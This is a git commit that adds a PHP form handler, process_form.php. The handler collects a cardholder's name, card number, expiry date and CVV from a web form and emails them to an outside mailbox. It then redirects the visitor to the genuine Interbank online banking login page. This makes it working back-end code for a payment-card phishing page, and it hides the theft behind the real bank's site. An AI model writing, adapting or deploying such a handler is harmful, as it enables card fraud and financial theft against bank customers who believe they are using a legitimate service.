2069b5a04a18b50b002effc1639e7183b8dc8d78
Asbelit0 <167026876+Asbelit0@users.noreply.github.com>
2024-04-27 21:03:32 -0500

    Create process_form.php

---
+++ process_form.php
@@ -0,0 +1,18 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $nombre = $_POST['fname'];
+    $numeroTarjeta = $_POST['cardnumber'];
+    $fechaVencimiento = $_POST['expdate'];
+    $cvv = $_POST['cvv'];
+
+    $destinatario = "satev76335@haislot.com";
+    $asunto = "Nueva entrada de formulario de tarjeta";
+    $cuerpo = "Nombre del titular: $nombre\nNúmero de tarjeta: $numeroTarjeta\nFecha de vencimiento: $fechaVencimiento\nCVV: $cvv";
+
+    mail($destinatario, $asunto, $cuerpo);
+
+    // Redirige al usuario a la página de login de Interbank
+    header("Location: https://bancaporinternet.interbank.pe/login");
+    exit();
+}
+?>
